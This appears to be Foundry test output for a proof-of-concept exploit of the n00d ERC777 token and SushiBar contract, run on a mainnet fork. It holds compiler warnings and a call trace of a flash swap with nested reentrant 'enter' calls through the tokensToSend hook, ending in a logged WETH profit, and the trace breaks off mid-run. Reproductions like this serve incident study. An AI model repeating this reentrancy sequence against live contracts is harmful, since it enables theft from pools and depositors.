@@ -1,0 +1,845 @@
+Compiling 21 files with Solc 0.8.10
+Solc 0.8.10 finished in 885.95ms
+Compiler run successful with warnings:
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:1084:5:
+     |
+1084 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:1896:5:
+     |
+1896 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:2198:5:
+     |
+2198 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:2967:5:
+     |
+2967 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:4462:5:
+     |
+4462 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+  --> test/N00d_exp.sol:25:5:
+   |
+25 |     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
+  --> test/N00d_exp.sol:62:28:
+   |
+62 |     function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
+   |                            ^^^^^^^^^^^^^^
+
+Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
+  --> test/N00d_exp.sol:62:44:
+   |
+62 |     function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
+   |                                            ^^^^^^^^^^^^^^^
+
+Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
+  --> test/N00d_exp.sol:62:61:
+   |
+62 |     function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
+   |                                                             ^^^^^^^^^^^^^^^
+
+Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
+  --> test/N00d_exp.sol:62:78:
+   |
+62 |     function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
+   |                                                                              ^^^^^^^^^^^^^^^^^^^
+
+Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
+  --> test/N00d_exp.sol:72:9:
+   |
+72 |         address operator,
+   |         ^^^^^^^^^^^^^^^^
+
+Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
+  --> test/N00d_exp.sol:73:9:
+   |
+73 |         address from,
+   |         ^^^^^^^^^^^^
+
+Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
+  --> test/N00d_exp.sol:75:9:
+   |
+75 |         uint256 amount,
+   |         ^^^^^^^^^^^^^^
+
+Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
+  --> test/N00d_exp.sol:76:9:
+   |
+76 |         bytes calldata userData,
+   |         ^^^^^^^^^^^^^^^^^^^^^^^
+
+Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
+  --> test/N00d_exp.sol:77:9:
+   |
+77 |         bytes calldata operatorData
+   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+
+Ran 1 test for test/N00d_exp.sol:ContractTest
+[PASS] testExploit() (gas: 859396)
+Logs:
+  Attacker WETH profit after exploit: 20.668267027908465821
+
+Traces:
+  [5817] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 15826379 [1.582e7])
+    │   └─ ← [Return] 0
+    └─ ← [Stop]
+
+  [1079510] ContractTest::testExploit()
+    ├─ [27371] ERC1820Registry::setInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─ emit InterfaceImplementerSet(addr: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], interfaceHash: 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895, implementer: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─  storage changes:
+    │   │   @ 0xd3db02fa4a38fd0a9e26aa400601da2b6a2d8a5a998b71ab8ecdc283ae940dd4: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   └─ ← [Stop]
+    ├─ [24667] n00dToken::approve(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─  storage changes:
+    │   │   @ 0xf259f4b2b5db0e44386e61e2cb8b24fdd9957ff29ff1309a6fe654f0f3ae24c5: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   └─ ← [Return] true
+    ├─ [2517] 0x5476DB8B72337d44A6724277083b1a927c82a389::getReserves() [staticcall]
+    │   └─ ← [Return] 20147297965411733145564 [2.014e22], 75400440702963015319 [7.54e19], 1666646531 [1.666e9]
+    ├─ [259967] 0x5476DB8B72337d44A6724277083b1a927c82a389::swap(20146297965411733145564 [2.014e22], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00)
+    │   ├─ [40789] n00dToken::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 20146297965411733145564 [2.014e22])
+    │   │   ├─ [2942] ERC1820Registry::getInterfaceImplementer(0x5476DB8B72337d44A6724277083b1a927c82a389, 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   ├─ emit Sent(operator: 0x5476DB8B72337d44A6724277083b1a927c82a389, from: 0x5476DB8B72337d44A6724277083b1a927c82a389, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 20146297965411733145564 [2.014e22], data: 0x, operatorData: 0x)
+    │   │   ├─ emit Transfer(from: 0x5476DB8B72337d44A6724277083b1a927c82a389, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 20146297965411733145564 [2.014e22])
+    │   │   ├─ [2942] ERC1820Registry::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x000000000000000000000000000000000000000000000444220c5be1753d07dc
+    │   │   │   @ 0x0cf11efc3216fd8d92c6a92805a2eac4af4db336f9ee2de125b726f80d875500: 0x0000000000000000000000000000000000000000000004442fed12951ca107dc → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   └─ ← [Return] true
+    │   ├─ [181242] ContractTest::uniswapV2Call(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 20146297965411733145564 [2.014e22], 0, 0x00)
+    │   │   ├─ [645] n00dToken::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 20146297965411733145564 [2.014e22]
+    │   │   ├─ [112903] SushiBar::enter(4029259593082346629112 [4.029e21])
+    │   │   │   ├─ [2645] n00dToken::balanceOf(SushiBar: [0x3561081260186E69369E6C32F280836554292E08]) [staticcall]
+    │   │   │   │   └─ ← [Return] 8058768001881461618923 [8.058e21]
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 3973241764582898790651 [3.973e21])
+    │   │   │   ├─ [76988] n00dToken::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 4029259593082346629112 [4.029e21])
+    │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   │   │   │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
+    │   │   │   │   ├─ [65644] ContractTest::tokensToSend(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 4029259593082346629112 [4.029e21], 0x, 0x)
+    │   │   │   │   │   ├─ [42772] SushiBar::enter(4029259593082346629112 [4.029e21])
+    │   │   │   │   │   │   ├─ [645] n00dToken::balanceOf(SushiBar: [0x3561081260186E69369E6C32F280836554292E08]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 8058768001881461618923 [8.058e21]
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 5959801309645300403925 [5.959e21])
+    │   │   │   │   │   │   ├─ [37557] n00dToken::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 4029259593082346629112 [4.029e21])
+    │   │   │   │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
+    │   │   │   │   │   │   │   ├─ [26213] ContractTest::tokensToSend(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 4029259593082346629112 [4.029e21], 0x, 0x)
+    │   │   │   │   │   │   │   │   ├─ [23241] SushiBar::enter(4029259593082346629112 [4.029e21])
+    │   │   │   │   │   │   │   │   │   ├─ [645] n00dToken::balanceOf(SushiBar: [0x3561081260186E69369E6C32F280836554292E08]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8058768001881461618923 [8.058e21]
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 8939609959571277181186 [8.939e21])
+    │   │   │   │   │   │   │   │   │   ├─ [18026] n00dToken::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 4029259593082346629112 [4.029e21])
+    │   │   │   │   │   │   │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
+    │   │   │   │   │   │   │   │   │   │   ├─ [1882] ContractTest::tokensToSend(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 4029259593082346629112 [4.029e21], 0x, 0x)
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   ├─ emit Sent(operator: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], amount: 4029259593082346629112 [4.029e21], data: 0x, operatorData: 0x)
+    │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], value: 4029259593082346629112 [4.029e21])
+    │   │   │   │   │   │   │   │   │   │   ├─ [2942] ERC1820Registry::getInterfaceImplementer(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x000000000000000000000000000000000000000000000444220c5be1753d07dc → 0x000000000000000000000000000000000000000000000369b4d6afe790fd9fe4
+    │   │   │   │   │   │   │   │   │   │   │   @ 0x02cb2bab5a8cadb81d126e67d0010d892c29c4fbfb048be8b822309b563c43ae: 0x0000000000000000000000000000000000000000000001b4dddf50874501f8eb → 0x00000000000000000000000000000000000000000000028f4b14fc81294160e3
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x00000000000000000000000000000000000000000000021a78aa007e29dd7fd0 → 0x0000000000000000000000000000000000000000000003ff16ac96a3affcf0d2
+    │   │   │   │   │   │   │   │   │   │   @ 2: 0x0000000000000000000000000000000000000000000003c943ae6a6c937ccbc6 → 0x0000000000000000000000000000000000000000000005ade1b10092199c3cc8
+    │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 37: 1 → 2
+    │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   ├─ emit Sent(operator: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], amount: 4029259593082346629112 [4.029e21], data: 0x, operatorData: 0x)
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], value: 4029259593082346629112 [4.029e21])
+    │   │   │   │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x000000000000000000000000000000000000000000000369b4d6afe790fd9fe4 → 0x00000000000000000000000000000000000000000000028f47a103edacbe37ec
+    │   │   │   │   │   │   │   │   @ 0x02cb2bab5a8cadb81d126e67d0010d892c29c4fbfb048be8b822309b563c43ae: 0x00000000000000000000000000000000000000000000028f4b14fc81294160e3 → 0x000000000000000000000000000000000000000000000369b84aa87b0d80c8db
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 2: 0x0000000000000000000000000000000000000000000002862ed2c7aeaf873cf1 → 0x0000000000000000000000000000000000000000000003c943ae6a6c937ccbc6
+    │   │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x0000000000000000000000000000000000000000000000d763ce5dc045e7f0fb → 0x00000000000000000000000000000000000000000000021a78aa007e29dd7fd0
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 37: 0 → 1
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ emit Sent(operator: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], amount: 4029259593082346629112 [4.029e21], data: 0x, operatorData: 0x)
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], value: 4029259593082346629112 [4.029e21])
+    │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x00000000000000000000000000000000000000000000028f47a103edacbe37ec → 0x0000000000000000000000000000000000000000000001b4da6b57f3c87ecff4
+    │   │   │   │   │   @ 0x02cb2bab5a8cadb81d126e67d0010d892c29c4fbfb048be8b822309b563c43ae: 0x000000000000000000000000000000000000000000000369b84aa87b0d80c8db → 0x00000000000000000000000000000000000000000000044425805474f1c030d3
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x0000000000000000000000000000000000000000000000d763ce5dc045e7f0fb
+    │   │   │   │   @ 2: 0x0000000000000000000000000000000000000000000001aecb0469ee699f4bf6 → 0x0000000000000000000000000000000000000000000002862ed2c7aeaf873cf1
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [490] SushiBar::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 18872653033799476375762 [1.887e22]
+    │   │   ├─ [17468] SushiBar::leave(18872653033799476375762 [1.887e22])
+    │   │   │   ├─ [645] n00dToken::balanceOf(SushiBar: [0x3561081260186E69369E6C32F280836554292E08]) [staticcall]
+    │   │   │   │   └─ ← [Return] 20146546781128501506259 [2.014e22]
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 18872653033799476375762 [1.887e22])
+    │   │   │   ├─ [12089] n00dToken::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 14177015278402345801525 [1.417e22])
+    │   │   │   │   ├─ [2942] ERC1820Registry::getInterfaceImplementer(SushiBar: [0x3561081260186E69369E6C32F280836554292E08], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   │   ├─ emit Sent(operator: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], from: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 14177015278402345801525 [1.417e22], data: 0x, operatorData: 0x)
+    │   │   │   │   ├─ emit Transfer(from: SushiBar: [0x3561081260186E69369E6C32F280836554292E08], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 14177015278402345801525 [1.417e22])
+    │   │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x02cb2bab5a8cadb81d126e67d0010d892c29c4fbfb048be8b822309b563c43ae: 0x00000000000000000000000000000000000000000000044425805474f1c030d3 → 0x0000000000000000000000000000000000000000000001439be439cbc84d999e
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x0000000000000000000000000000000000000000000001b4da6b57f3c87ecff4 → 0x0000000000000000000000000000000000000000000004b56407729cf1f16729
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x0000000000000000000000000000000000000000000003ff16ac96a3affcf0d2 → 0
+    │   │   │   │   @ 2: 0x0000000000000000000000000000000000000000000005ade1b10092199c3cc8 → 0x0000000000000000000000000000000000000000000001aecb0469ee699f4bf6
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [14740] n00dToken::transfer(0x5476DB8B72337d44A6724277083b1a927c82a389, 20207921730603543777894 [2.02e22])
+    │   │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   │   │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
+    │   │   │   ├─ [1771] ContractTest::tokensToSend(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x5476DB8B72337d44A6724277083b1a927c82a389, 20207921730603543777894 [2.02e22], 0x, 0x)
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ emit Sent(operator: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x5476DB8B72337d44A6724277083b1a927c82a389, amount: 20207921730603543777894 [2.02e22], data: 0x, operatorData: 0x)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x5476DB8B72337d44A6724277083b1a927c82a389, value: 20207921730603543777894 [2.02e22])
+    │   │   │   ├─ [2942] ERC1820Registry::getInterfaceImplementer(0x5476DB8B72337d44A6724277083b1a927c82a389, 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x0000000000000000000000000000000000000000000004b56407729cf1f16729 → 0x00000000000000000000000000000000000000000000006deac77ec980c014c3
+    │   │   │   │   @ 0x0cf11efc3216fd8d92c6a92805a2eac4af4db336f9ee2de125b726f80d875500: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000 → 0x0000000000000000000000000000000000000000000004478720aa8718955266
+    │   │   │   └─ ← [Return] true
+    │   │   ├─  storage changes:
+    │   │   │   @ 38: 0 → 0x0000000000000000000000000000000000000000000000da6d35abf9e43f67f8
+    │   │   └─ ← [Stop]
+    │   ├─ [645] n00dToken::balanceOf(0x5476DB8B72337d44A6724277083b1a927c82a389) [staticcall]
+    │   │   └─ ← [Return] 20208921730603543777894 [2.02e22]
+    │   ├─ [2534] WETH9::balanceOf(0x5476DB8B72337d44A6724277083b1a927c82a389) [staticcall]
+    │   │   └─ ← [Return] 75400440702963015319 [7.54e19]
+    │   ├─ emit Sync(reserve0: 20208921730603543777894 [2.02e22], reserve1: 75400440702963015319 [7.54e19])
+    │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 20207921730603543777894 [2.02e22], amount1In: 0, amount0Out: 20146297965411733145564 [2.014e22], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─  storage changes:
+    │   │   @ 9: 0x00000000000000000000000000000000282fe98645d307a3c23f5a770066685c → 0x0000000000000000000000000000000029356b97c26f8dba7fe7951b6d7020c8
+    │   │   @ 8: 0x6357020300000000000416642d54a803de970000000004442fed12951ca107dc → 0x635812f700000000000416642d54a803de970000000004478720aa8718955266
+    │   │   @ 10: 0x000000000000000000000000000020ff88f1e77cc85eb4795bad471f9ec7fa74 → 0x0000000000000000000000000000221c6f1b516cde71d8380f921ad201460558
+    │   └─ ← [Stop]
+    ├─ [517] 0x5476DB8B72337d44A6724277083b1a927c82a389::getReserves() [staticcall]
+    │   └─ ← [Return] 20208921730603543777894 [2.02e22], 75400440702963015319 [7.54e19], 1666716407 [1.666e9]
+    ├─ [160007] 0x5476DB8B72337d44A6724277083b1a927c82a389::swap(20207921730603543777894 [2.02e22], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00)
+    │   ├─ [10089] n00dToken::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 20207921730603543777894 [2.02e22])
+    │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(0x5476DB8B72337d44A6724277083b1a927c82a389, 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   ├─ emit Sent(operator: 0x5476DB8B72337d44A6724277083b1a927c82a389, from: 0x5476DB8B72337d44A6724277083b1a927c82a389, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 20207921730603543777894 [2.02e22], data: 0x, operatorData: 0x)
+    │   │   ├─ emit Transfer(from: 0x5476DB8B72337d44A6724277083b1a927c82a389, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 20207921730603543777894 [2.02e22])
+    │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x00000000000000000000000000000000000000000000006deac77ec980c014c3 → 0x0000000000000000000000000000000000000000000004b56407729cf1f16729
+    │   │   │   @ 0x0cf11efc3216fd8d92c6a92805a2eac4af4db336f9ee2de125b726f80d875500: 0x0000000000000000000000000000000000000000000004478720aa8718955266 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   └─ ← [Return] true
+    │   ├─ [135842] ContractTest::uniswapV2Call(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 20207921730603543777894 [2.02e22], 0, 0x00)
+    │   │   ├─ [645] n00dToken::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 22235534464567039059753 [2.223e22]
+    │   │   ├─ [100103] SushiBar::enter(4447106892913407811950 [4.447e21])
+    │   │   │   ├─ [645] n00dToken::balanceOf(SushiBar: [0x3561081260186E69369E6C32F280836554292E08]) [staticcall]
+    │   │   │   │   └─ ← [Return] 5969531502726155704734 [5.969e21]
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 5920054662142607864643 [5.92e21])
